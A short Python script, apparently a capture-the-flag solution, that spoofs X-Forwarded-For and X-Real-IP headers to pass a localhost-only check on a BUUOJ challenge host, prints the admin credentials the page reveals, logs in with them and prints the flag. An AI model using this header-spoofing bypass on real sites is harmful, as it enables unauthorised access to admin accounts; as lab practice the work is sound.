import requests

url = 'http://node5.buuoj.cn:25059/'
headers={'X-Forwarded-For':'127.0.0.1', 'X-Real-IP':'127.0.0.1'}
r = requests.get(url, headers=headers)
print(r.text)
'''
<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="UTF-8">
    <title>登录</title>
</head>
<body>
<div style="text-align: center">
    <form action="" method="post">
        用户名：<input type="text" name="username" value="admin"/><br>
        密码：<input type="password" name="password" value="wwoj2wio2jw93ey43eiuwdjnewkndjlwe"/><br>
        <input type="submit" value="登录"/>
    </form>
</div>
</body>
</html>
'''
data = {
    'username':'admin', 
    'password':'wwoj2wio2jw93ey43eiuwdjnewkndjlwe'
}
r = requests.post(url, headers=headers, data=data)
print(r.text)
'''
登录成功！flag{d0a6aefb-d565-4871-944a-ed1f63096948}
'''